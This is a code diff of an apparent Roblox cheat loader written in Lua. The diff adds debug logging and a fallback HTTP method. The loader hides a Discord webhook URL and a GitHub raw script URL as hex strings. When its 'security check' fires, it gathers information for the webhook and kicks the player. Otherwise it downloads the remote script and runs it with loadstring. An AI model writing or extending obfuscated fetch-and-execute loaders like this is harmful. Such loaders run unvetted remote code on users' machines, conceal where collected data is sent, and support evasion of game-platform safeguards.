@@ -8,6 +8,9 @@ local _req = (syn and syn.request) or (http and http.request) or http_request or
 local _L = game:GetService("Players").LocalPlayer
 local _H = game:GetService("HttpService")
 
+warn("[NK] === LOADER START ===")
+warn("[NK] _req exists: " .. tostring(_req ~= nil))
+
 local _tk = "N/A"
 pcall(function()
     if isfile and readfile and writefile then
@@ -37,7 +40,10 @@ local function _SC()
 end
 
 local _se = _SC()
+warn("[NK] Security check result: " .. tostring(_se))
+
 if _se then
+    warn("[NK] Security triggered, kicking...")
     local _A = _0xH("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
     local ni = {}
     pcall(function()
@@ -75,6 +81,8 @@ if _se then
     return
 end
 
+warn("[NK] Setting up auth...")
+
 local _TS = game:GetService("TestService")
 local _ST = _TS:FindFirstChild("__NK_RUNTIME")
 if not _ST then
@@ -88,24 +96,54 @@ _AU.Value = "V8_SECURE_AUTH"
 _AU.Parent = _ST
 shared._NK_AUTH = "V8_SECURE_AUTH"
 
--- ссылка: https://raw.githubusercontent.com/itseasyrpg/rpgg/refs/heads/main/rpg.lua
+warn("[NK] Auth OK")
+
 local _G_URL = _0xH("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F697473656173797270672F727067672F726566732F68656164732F6D61696E2F7270672E6C7561")
 
-warn("[NK] Loading from: " .. _G_URL)
+warn("[NK] URL: " .. _G_URL)
+warn("[NK] URL length: " .. #_G_URL)
 
-local ok, res = pcall(function() return game:HttpGet(_G_URL) end)
+local res = nil
+local method = "none"
 
-if ok and res and #res > 0 then
-    warn("[NK] Got response, length: " .. #res)
+local ok1, r1 = pcall(function() return game:HttpGet(_G_URL) end)
+warn("[NK] HttpGet ok=" .. tostring(ok1) .. " len=" .. tostring(r1 and #r1 or 0))
+if not ok1 then
+    warn("[NK] HttpGet error: " .. tostring(r1))
+end
+if ok1 and r1 and #r1 > 0 then
+    res = r1
+    method = "HttpGet"
+end
+
+if not res and _req then
+    warn("[NK] Trying fallback request...")
+    local ok2, r2 = pcall(_req, {Url = _G_URL, Method = "GET"})
+    warn("[NK] request ok=" .. tostring(ok2))
+    if ok2 and r2 then
+        warn("[NK] request StatusCode: " .. tostring(r2.StatusCode))
+        if r2.Body and #r2.Body > 0 then
+            res = r2.Body
+            method = "request"
+        end
+    end
+end
+
+warn("[NK] Final method: " .. method)
+warn("[NK] Final res len: " .. tostring(res and #res or 0))
+
+if res and #res > 0 then
+    warn("[NK] Preview: " .. res:sub(1, 100))
     local f, err = loadstring(res)
     if f then
         warn("[NK] Loadstring OK, spawning...")
         task.spawn(f)
+        warn("[NK] === LOADER END ===")
     else
-        warn("[NK] Loadstring failed: " .. tostring(err))
-        _L:Kick("Error 0x83: Script parse failed")
+        warn("[NK] Loadstring error: " .. tostring(err))
+        _L:Kick("Error 0x83: " .. tostring(err))
     end
 else
-    warn("[NK] HttpGet failed: " .. tostring(res))
-    _L:Kick("Error 0x82: " .. tostring(res))
+    warn("[NK] Both methods failed")
+    _L:Kick("Error 0x82")
 end
